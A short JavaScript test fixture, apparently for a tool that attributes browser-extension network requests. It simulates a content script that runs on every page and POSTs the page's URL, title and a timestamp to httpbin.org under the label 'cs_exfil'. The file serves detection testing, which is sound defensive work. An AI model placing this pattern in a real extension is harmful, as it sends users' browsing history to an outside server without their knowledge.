// Simulates: redcoolmedia content scripts, WhatRuns wrs_env.js
// Pattern: CS runs on every page and sends data to external server.
// This tests whether the request is attributed to 'cs' or 'page'.

(async () => {
  // Skip extension pages
  if (location.protocol === 'chrome-extension:' || location.protocol === 'chrome:') return;

  try {
    await fetch('https://httpbin.org/post', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'cs_exfil',
        url: location.href,
        title: document.title,
        ts: Date.now(),
      }),
    });
    console.log('[TEST] CS fetch sent for', location.href);
  } catch (e) {
    console.log('[TEST] CS fetch failed:', e.message);
  }
})();
